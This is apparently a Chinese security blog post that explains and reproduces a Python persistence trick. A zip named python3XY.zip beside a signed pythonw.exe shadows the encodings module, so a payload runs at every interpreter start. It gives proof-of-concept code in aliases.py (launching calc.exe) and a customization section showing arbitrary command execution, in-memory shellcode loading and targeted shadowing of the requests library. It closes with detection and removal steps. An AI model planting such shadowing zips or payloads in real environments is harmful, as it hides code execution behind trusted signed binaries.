#  下载的python也可能是木马？pythonw.exe 木马全链路复现  
原创 网络安全透视镜
                    网络安全透视镜  网络安全透视镜   2026-09-30 09:23  
  
QUOTE  
  
一个 zip 被放进 pythonw.exe 的同目录，所有签名校验都无从察觉——  
   
每逢解释器启动  
   
，启动必经的 encodings 模块就会替攻击者按下执行键。  
  
—— 网络安全透视镜  
  
外层是  
   
官方签名  
   
的 pythonw.exe 与 python314.dll，恶意代码藏身同目录的 python314.zip。本文在该文披露的机制基础上完成本地复现，从问题根源、产生原因、复现验证、载荷定制与检测清除五个层面展开分析。  
  
复现全程使用  
   
良性载荷  
   
（弹出计算器），未包含任何恶意代码，复现目录内的每个文件均可审阅。  
  
本文看点  
  
01  
  
三重机制叠加：getpath、zipimport 与 encodings 如何拼出执行路径  
  
02  
  
完整本地复现：官方签名 exe 加恶意 zip 的复刻与验证  
  
03  
  
载荷定制方法：如何改写 zip 内文件执行自定义命令  
  
01  
  
PHENOMENON  
### 现象：一次「干净」得反常的样本  
  
  
先看样本的目录构成。三类文件摆在同一层，两个带签名，一个 zip。  
  
.  
.  
.  
text  
  
D:\SomeApp\  
  
├─ pythonw.exe　　　← 官方签名  
  
├─ python314.dll　　← 官方签名  
  
└─ python314.zip　　← 恶意代码在这里面  
  
从签名侧看，这套样本没有破绽。pythonw.exe 与 python314.dll 都是 Python 官方发行版文件，证书链核验均属正常；真正承载执行逻辑的是那个多出来的 zip。它不在 PYTHONPATH 里，也没有  
   
.pth 文件或 sitecustomize.py  
   
指向它——常规的入口排查走不通。  
  
要确认 zip 是否被加载，需要把 sys.path 落盘。pythonw.exe 是 Windows 子系统程序，  
   
没有控制台  
   
，print 打不出来，探测结果必须写文件。  
  
.  
.  
.  
python  
  
# probe.py  
  
import sys  
  
open(r"D:\out.txt", "w").write("\n".join(sys.path))  
  
运行后 out.txt 的内容证实了异常——zip 路径确在 sys.path 中，且  
   
排序先于 DLLs 与 Lib  
   
。  
  
.  
.  
.  
out.txt  
  
D:\SomeApp  
  
D:\SomeApp\python314.zip  
  
D:\SomeApp\DLLs  
  
D:\SomeApp\Lib  
  
D:\SomeApp  
  
排序本身就是风险所在。核心事实速览如下。  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">维度</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">事实</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">样本构成</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">官方签名 pythonw.exe + python314.dll + 恶意 python314.zip</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">命名规则</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">python{主版本}{次版本}.zip，与版本严格匹配，错一个字不加载</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">生效硬约束</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">zip 必须与正在加载的 pythonXY.dll 同目录（取 DLL 位置，非 exe 位置）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">执行时机</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">解释器每次启动，import encodings 阶段，先于任何用户代码</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">载荷入口</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">zip 内 encodings 包，或任一非 frozen 的纯 Python 模块</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">持久化痕迹</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">无启动项、无计划任务、无可疑进程名</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">实锤检测</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">encodings.__file__ 指向 zip 内部路径</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">清除方式</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">删除恶意 zip 即可，无需改动任何签名文件</span></section></td></tr></tbody></table>  
  
「位置靠前，意味着 zip 里的模块会盖掉标准库里的同名模块。」  
  
  
02  
  
ROOT CAUSE  
### 根源：三重机制叠加出的执行路径  
  
  
这条链上  
   
没有一处漏洞  
   
，是三套合理设计叠加的结果。逐个拆解。  
  
2.1 pythonw.exe 只负责把 DLL 拉起来  
  
pythonw.exe 的全部源码不到 20 行，入口 wWinMain 的函数体只有一句 Py_Main；工程未写 SubSystem，继承公共属性表的默认值 Windows，链接器因此寻找 wWinMain 而非 main——这也是它  
   
不弹黑窗口  
   
的原因。参数解析、路径计算、模块加载都不在 exe 里发生。  
  
2.2 getpath.py：sys.path 是一段 Python 代码算出来的  
  
从 CPython 3.11 起，Windows 上的启动路径计算被改写为 Python 脚本 getpath.py，预编译成 marshal 字节码  
   
冻结进 python314.dll  
   
，初始化时由 C 侧执行：C 注入编译期常量、环境变量与可执行文件路径，跑完 getpath.py 后从 dict 里取回 sys.path。  
  
.  
.  
.  
调用链  
  
pythonw.exe!wWinMain → Py_Main → Py_InitializeFromConfig  
  
　→ _PyConfig_InitPathConfig → getpath.c  
  
　→ PyEval_EvalCode(getpath.py) → 取回 sys.path  
  
zip 的文件名来自一个模板，版本号由 C 侧注入：  
  
.  
.  
.  
getpath.py  
  
ZIP_LANDMARK = f'python{VERSION_MAJOR}{VERSION_MINOR}{PYDEBUGEXT or ""}.zip'  
  
Release 版 3.14 出来就是 python314.zip，debug 构建是 python314_d.zip，自由线程构建是 python314t.zip。  
   
名字错一个字都不会被加载  
   
。  
  
目录选择上，Windows 用的是 library_dir 而非 prefix，源码注释标了 QUIRK。library 是当前进程实际加载的 python314.dll 的完整路径，靠 DllMain 的副作用（进程加载时把 HMODULE 存进全局变量）经 GetModuleFileNameW 取得。对复现者这是一条硬约束：  
   
zip 必须与 pythonXY.dll 同目录  
   
，放 DLLs 子目录或别处都不生效。  
  
更关键的差异在存在性检查。默认路径拼装是直接 append，而同文件另一处用 zip 反推 prefix 时是带 isfile 判断的：  
  
.  
.  
.  
python  
  
# 默认路径拼装：不检查 zip 是否存在  
  
pythonpath.append(joinpath(library_dir, ZIP_LANDMARK))  
  
  
# 用 zip 反推 prefix：有 isfile 判断  
  
if isfile(joinpath(library_dir, ZIP_LANDMARK)):  
  
　　prefix = library_dir  
  
直接后果是：即使解释器目录里根本没有 zip，sys.path 里照样会有这一条。本次复现做了对照实验——把 python313.zip 改名移走后重启，sys.path 输出中该路径  
   
依然存在  
   
。  
  
2.3 zipimport：把 zip 变成可 import 的路径  
  
sys.path 里有字符串只是第一步。zip 不是目录，FileFinder 读不了，需要 zipimport 注册成 path hook。它的注册位置是 path_hooks 的最前端：  
  
.  
.  
.  
init_zipimport  
  
sys.path_hooks.insert(0, zipimporter)  
  
排在 index 0，意味着此后每个 sys.path 条目进来，导入系统都会先问 zipimporter。  
  
2.4 encodings：启动必经、且不是 frozen  
  
启动顺序上，zipimport 钩子先装好，encodings 的导入随后发生：_PyCodecRegistry_Init 主动 import encodings，因为解释器要处理字符串和 I/O 就得有编码系统。那为什么不是 os 或 codecs？因为它们是被  
   
frozen  
   
的：  
  
.  
.  
.  
python  
  
>>> import importlib.util, sys  
  
>>> for n in ('encodings', 'codecs', 'site', 'zipimport', 'os', 'abc'):  
  
...　　 s = importlib.util.find_spec(n)  
  
...　　 print(f'{n:12} {type(s.loader).__name__:18} {s.origin}')  
  
  
encodings　SourceFileLoader　D:\SomeApp\Lib\encodings\__init__.py　← 不是 frozen  
  
codecs　　　type　　　　　　frozen  
  
site　　　　type　　　　　　frozen  
  
zipimport　　　type　　　　　　frozen  
  
os　　　　　type　　　　　　frozen  
  
abc　　　　　type　　　　　　frozen  
  
FrozenImporter 在 sys.meta_path 中位于 PathFinder 之前，冻结模块是内嵌在 python314.dll 里的字节码，在 sys.path 被搜索之前就解析完了。往 zip 里塞同名的 codecs.py 或 os.py，加载时根本不会看。encodings 是唯一一个走 SourceFileLoader、老老实实从 sys.path 上找的  
   
启动必经模块  
   
。  
  
样本选 encodings 不是随手挑的——启动链上非 frozen 的模块里，就它一个。  
  
于是 zip 在 sys.path[1]、Lib 在 sys.path[3]，zip 内的 encodings/__init__.py 会盖掉标准库那一份，而这个文件每次启动都会被导入。  
  
  
03  
  
WHY IT WORKS  
### 产生原因：设计叠加出的攻击路径  
  
  
以下为分析观点：本章对攻击收益与动机的归因属分析意见；事实部分（签名状态、机制行为、遮蔽范围）已在第 1、2 章给出依据。  
  
其一，  
 **签名防线失效**  
   
。三类文件里没有一个会被判为恶意。exe 与 dll 是官方发行版原文件，zip 是归档容器，签名体系天然只覆盖前两者。按「看签名、看证书链」的常规分析，样本确实挑不出毛病。  
  
其二，  
 **机制是分发设计而非漏洞**  
   
。zip 进 sys.path 是给嵌入式分发用的标准机制；无条件 append 是为了让「zip 可选存在」这个设计成立；encodings 早导入是为了让解释器能处理编码。  
   
三件事单独看都合理  
   
，叠在一起就是一条稳定的执行路径。  
  
其三，  
 **遮蔽面不止 encodings**  
   
。zip 排在 DLLs 与 Lib 之前，能盖掉的是所有非 frozen 的纯 Python 模块。encodings 只是「保证每次启动都执行」的最优解；如果目标是某个业务应用，zip 里放一个 requests/__init__.py 就够——那个时间点 builtins 已经完整，载荷写法没有限制。  
  
其四，  
 **形态可调**  
   
。要每次启动必跑，盖 encodings；只针对某个应用，盖它依赖的第三方库；要体积小，一个 zip 塞几个模块即可。  
  
必发型  
  
遮蔽 encodings，每次解释器启动必执行，适合广撒网投放。  
  
针对型  
  
遮蔽目标业务依赖的第三方库，只对该应用生效，误触面小。  
  
轻量型  
  
一个 zip 只塞少数模块，体积与痕迹都压到最小。  
  
全程不碰签名、不落可疑可执行文件、不加持久化项——「干净」本身就是这套手法的伪装。  
  
  
04  
  
REPRODUCTION  
### 复现：本地完整复刻  
  
  
复现目标：在本地用官方 pythonw.exe（Python 3.13.12）复刻「同目录 zip 遮蔽 encodings」，  
   
载荷仅弹计算器  
   
。复现目录即当前工作目录，所有文件可审阅。  
  
STEP 01  
还原官方解释器环境  
  
从官方发行版复制 pythonw.exe、python313.dll、python3.dll 与 vcruntime 运行依赖到复现目录，并把 Lib 与 DLLs 通过 junction 指向官方标准库——保证解释器完整可用，与样本场景一致。  
  
.  
.  
.  
bash  
  
cp <python目录>\pythonw.exe python313.dll python3.dll vcruntime140*.dll .  
  
mklink /J Lib <python目录>\Lib  
  
mklink /J DLLs <python目录>\DLLs  
  
STEP 02  
构造 python313.zip  
  
架构选择：zip 内 encodings/__init__.py 使用标准库原版（register 逻辑原样执行，对解释器零副作用），把 payload 前缀进 aliases.py——encodings 包被 zip 加载后，__init__.py 顶层的   
from . import aliases  
   
必然导入 zip 内的这一份；同时把 encodings.__path__ 指回标准库目录，后续 codec 子模块照常加载。  
  
.  
.  
.  
python  
  
# zip 内 encodings/aliases.py 的 payload 前缀  
  
import ctypes  
  
# 弹计算器：原文样本此处为内存加载 shellcode  
  
ctypes.windll.user32.WinExecW("calc.exe", 5)  
  
  
import os, sys  
  
os.write(os.open(rb".\PWNED.txt",  
  
　　os.O_WRONLY | os.O_APPEND | os.O_CREAT, 0o600),  
  
　　b"payload executed\n")  
  
# codec 子模块的查找指回标准库  
  
sys.modules["encodings"].__path__ = [sys.prefix + "\\Lib\\encodings"]  
  
  
aliases = { ... }　# ── 以下为标准库原始 aliases.py 内容 ──  
  
STEP 03  
运行验证  
  
运行本目录的 pythonw.exe 加载探针脚本（pythonw 无控制台，结果写文件）。PWNED.txt 记录了执行证据：  
  
.  
.  
.  
PWNED.txt  
  
PoC: encodings.aliases in python313.zip executed  
  
WinExec(calc.exe) rc: 42  
  
探针同步记录的 encodings 实际加载位置：  
  
.  
.  
.  
probe_out.txt  
  
encodings.__file__ = E:\WXArt\pythonw\python313.zip\encodings\__init__.py  
  
验证结果汇总：  
  
<table><thead><tr><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">验证项</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">结果</span></section></th><th style="background: rgb(39, 39, 42);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 12px;text-align: left;"><section><span leaf="">证据</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">zip 进入 sys.path</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">通过</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">探针输出含 python313.zip，位于 DLLs/Lib 之前</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">encodings 被遮蔽</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">通过</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">encodings.__file__ 指向 zip 内部</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">载荷每次启动必执行</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">通过</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">PWNED.txt 每次运行追加</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">计算器进程拉起</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">通过</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);background: rgb(250, 250, 250);"><section><span leaf="">WinExecW 返回值 42（大于 31 为成功句柄）</span></section></td></tr><tr><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">解释器行为正常</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">通过</span></section></td><td style="padding: 8px 12px;border-bottom: 1px solid rgb(228, 228, 231);color: rgb(82, 82, 91);"><section><span leaf="">退出码 0，codecs 对 utf-8 查找正常</span></section></td></tr></tbody></table>  
  
NOTE  
  
复现实测发现的两个时序坑：其一，encodings 导入阶段 builtins 里还没有 open（io.open 尚未注入），此时 open() 抛 NameError，用 str 路径还会触发文件系统编码查找、抛 LookupError——文件 I/O 必须改用   
os.open / os.write  
   
加 bytes 路径；其二，user32.dll 只导出 WinExecA / WinExecW，没有 WinExec，ctypes.windll.user32.WinExec 会直接 AttributeError。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/m3tfzlbEQPrhnPibeGQeib2RuSxliaGNkUjHuLibOM93PgPlKcflmoIJmcibdIZrQZywkdkmYFkX79Z3SwSKmiaejVrnhn9s6jew2vkibV2S3REOlo/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
PAYLOAD  
### 使用与载荷定制：从弹计算器到自定义命令  
  
  
载荷全部集中在 zip 内 aliases.py 的前缀，  
   
改写代价只有一个文件  
   
，且不触碰任何签名文件。以下给出从验证到定制的路径。  
  
STEP 01  
弹计算器（最小验证）  
  
已验证：  
   
WinExecW("calc.exe", 5)  
   
返回值 42。这是无害的执行成功信号，替代真实样本的内存 shellcode。  
  
STEP 02  
自定义执行命令  
  
把字符串换成任意命令即可。以执行系统命令为例：  
  
.  
.  
.  
python  
  
import ctypes  
  
ctypes.windll.user32.WinExecW(  
  
　　'cmd.exe /c whoami > C:\\tmp\\out.txt 2>&1', 0)  
  
习惯 PowerShell 就换成   
powershell -c "..."   
；需要等待结束用 os.system，需要拿输出用   
subprocess.run  
   
——此阶段 builtins 虽不完整，但 os、sys、ctypes 与标准库导入机制都可用。注意路径与引号在 WinExecW 里的转义。  
  
STEP 03  
内存执行形态  
  
真实样本的做法是在此用 ctypes 内存加载 shellcode：VirtualAlloc 分配、memcpy 写入、CreateThread 执行，全程不落可执行文件。本文不复现该步骤，仅指出入口位置。  
  
STEP 04  
针对性投递  
  
把 encodings 换成目标业务依赖的模块（如   
requests/__init__.py  
   
），载荷只在使用该库的应用启动时触发，隐蔽性更高、误触面更小。  
  
以上定制仅限授权环境下的验证与防御研究。载荷文件就是 zip 内的一个 .py，删除即失效；签名文件全程零改动。  
  
  
06  
  
DEFENSE  
### 检测与清除  
  
  
排查分两条线：  
   
目录侧看 zip 是否存在  
   
，运行时看模块实际指向。  
  
STEP 01  
目录侧排查  
  
.  
.  
.  
cmd  
  
dir <python目录>\python*.zip  
  
rem 覆盖 debug（_d）与自由线程（t）构建  
  
dir <python目录>\python3*_d.zip <python目录>\python3*t.zip  
  
官方安装包不生成 pythonXY.zip，  
   
解释器目录一旦出现即需人工研判  
   
。  
  
STEP 02  
运行时确认  
  
.  
.  
.  
python  
  
# 探针（pythonw 无控制台，输出写文件）  
  
import encodings  
  
open(r"C:\tmp\chk.txt", "w").write(encodings.__file__)  
  
正常结果应为   
<python目录>\Lib\encodings\__init__.py  
   
；若指向   
<python目录>\pythonXY.zip\encodings\__init__.py  
   
，即为实锤失陷。  
  
NOTE  
  
sys.path 中出现 zip 路径不等于中招——getpath.py 无条件 append，正常环境也如此；判据只有 encodings.__file__ 的实际指向。  
  
确认后删除恶意 zip 即可，无需改动任何签名文件；若同一环境多次出现或怀疑被持续利用，  
   
按入侵事件流程重装解释器与依赖  
   
。  
  
  
07  
  
SOURCES  
### 参考  
  
  
1  
[pythonw？也可能是木马？](https://mp.weixin.qq.com/s?__biz=MzU4NTg4MzIzNA==&mid=2247485046&idx=1&sn=d3b48742e29c8d15bdee1a815c08b150&scene=21#wechat_redirect)  
  
  
  
  
∞  
  
THE END  
### 结语  
  
  
把链路收束成一句话：空壳 exe 把 DLL 拉起来，DLL 里冻结的 getpath.py 无条件把同目录 zip 排上启动搜索位，zipimport 让 zip 可被导入，encodings 作为启动必经的非 frozen 模块替攻击者完成加载。  
  
「没有漏洞被利用，只有设计被叠加——而叠加的每一环，单独看都合理。」  
  
END  
  
我是   
网络安全透视镜  
  
如果你觉得今天这篇有收获，欢迎  
 **点赞、在看、转发**  
   
三连，我们下篇见。  
  
